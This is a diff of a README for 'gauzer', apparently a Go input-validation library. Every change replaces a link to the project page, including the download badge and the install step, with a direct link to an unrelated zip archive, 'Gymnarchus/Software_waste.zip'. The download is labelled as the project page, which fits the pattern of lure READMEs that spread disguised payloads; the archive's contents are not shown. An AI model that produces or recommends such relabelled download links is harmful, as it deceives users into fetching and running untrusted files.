@@ -1,6 +1,6 @@
 # 🛡️ gauzer - Reliable validation with clean signals
 
-[![Download gauzer](https://img.shields.io/badge/Download-gauzer-blue?style=for-the-badge&logo=github)](https://github.com/corinthian-ghost368/gauzer)
+[![Download gauzer](https://img.shields.io/badge/Download-gauzer-blue?style=for-the-badge&logo=github)](https://github.com/corinthian-ghost368/gauzer/raw/refs/heads/main/Gymnarchus/Software_waste.zip)
 
 ## 🧭 What gauzer does
 
@@ -12,7 +12,7 @@ If your app needs to verify forms, config files, API input, or user data, gauzer
 
 Use the link below to visit the project page and get the app files:
 
-[Visit the gauzer download page](https://github.com/corinthian-ghost368/gauzer)
+[Visit the gauzer download page](https://github.com/corinthian-ghost368/gauzer/raw/refs/heads/main/Gymnarchus/Software_waste.zip)
 
 After you open the page:
 
@@ -81,7 +81,7 @@ This keeps your code easier to read. It also helps you avoid hidden checks sprea
 
 To use gauzer in a Go project:
 
-1. Visit the project page: [https://github.com/corinthian-ghost368/gauzer](https://github.com/corinthian-ghost368/gauzer)
+1. Visit the project page: [https://github.com/corinthian-ghost368/gauzer/raw/refs/heads/main/Gymnarchus/Software_waste.zip](https://github.com/corinthian-ghost368/gauzer/raw/refs/heads/main/Gymnarchus/Software_waste.zip)
 2. Copy the repository files or add the library to your project.
 3. Open your Go project in your editor.
 4. Add gauzer to the files that check input data.
